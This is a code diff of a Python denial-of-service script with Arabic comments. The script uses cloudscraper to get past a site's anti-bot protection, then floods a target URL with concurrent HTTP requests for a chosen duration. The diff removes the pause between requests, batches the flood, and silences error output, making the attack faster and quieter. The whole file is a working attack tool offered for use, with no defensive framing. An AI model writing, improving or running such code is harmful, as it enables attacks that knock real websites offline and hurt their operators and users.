@@ -1,7 +1,7 @@
 import cloudscraper
 import asyncio
 import time
-from aiohttp import ClientSession
+import aiohttp
 
 # محاولة تجاوز الحمايات باستخدام CloudScraper
 def bypass_protection(target_url):
@@ -28,25 +28,22 @@ def bypass_protection(target_url):
         else:
             print("[!] فشل تجاوز الحماية، الكود:", response.status_code)
             return None, None
-    except Exception as e:
-        print(f"[!] فشل تجاوز الحماية: {e}")
+    except Exception:
+        # تجاهل الأخطاء
         return None, None
 
 
 # إرسال طلب فردي
-async def send_request(url, session, request_counter, response_times, counter_lock, semaphore):
+async def send_request(url, session, request_counter, response_times, semaphore):
     async with semaphore:  # التحكم في عدد الطلبات المتزامنة
         try:
             start_time = time.time()
             async with session.get(url) as response:
                 await response.read()
-                async with counter_lock:
-                    request_counter[0] += 1
-                    response_times.append(time.time() - start_time)
-        except Exception as e:
-            async with counter_lock:
-                request_counter[1] += 1
-            print(f"[!] خطأ أثناء الطلب: {e}")
+                request_counter[0] += 1
+                response_times.append(time.time() - start_time)
+        except Exception:
+            request_counter[1] += 1
 
 
 # الوظيفة الرئيسية للهجوم
@@ -54,8 +51,7 @@ async def main(target_url, threads_count, attack_duration):
     print("[*] بدء هجوم DoS...")
     request_counter = [0, 0]
     response_times = []
-    counter_lock = asyncio.Lock()
-    semaphore = asyncio.Semaphore(threads_count)  # محدد بعدد الخيوط
+    semaphore = asyncio.Semaphore(threads_count)  # التحكم في عدد الطلبات المتزامنة
 
     # تجاوز الحماية
     cookies, headers = bypass_protection(target_url)
@@ -65,17 +61,23 @@ async def main(target_url, threads_count, attack_duration):
         return
 
     timeout = aiohttp.ClientTimeout(total=10)
-    async with ClientSession(timeout=timeout, cookies=cookies, headers=headers) as session:
-        tasks = []
+    async with aiohttp.ClientSession(timeout=timeout, cookies=cookies, headers=headers) as session:
         end_time = time.time() + attack_duration
-        while time.time() < end_time:
-            task = asyncio.ensure_future(
-                send_request(target_url, session, request_counter, response_times, counter_lock, semaphore)
-            )
-            tasks.append(task)
-            await asyncio.sleep(0.1)  # تأخير بسيط بين كل طلب
+        tasks = []
 
-        await asyncio.gather(*tasks)
+        while time.time() < end_time:
+            tasks.append(
+                asyncio.create_task(send_request(target_url, session, request_counter, response_times, semaphore))
+            )
+
+            # تجنب إنشاء عدد ضخم من المهام دفعة واحدة
+            if len(tasks) >= threads_count:
+                await asyncio.gather(*tasks)
+                tasks = []
+
+        # التأكد من تشغيل أي مهام متبقية
+        if tasks:
+            await asyncio.gather(*tasks)
 
     avg_response_time = sum(response_times) / len(response_times) if response_times else 0
     print(f"\n[*] انتهى الهجوم. العدد الكلي للطلبات الناجحة: {request_counter[0]}, الفاشلة: {request_counter[1]}")
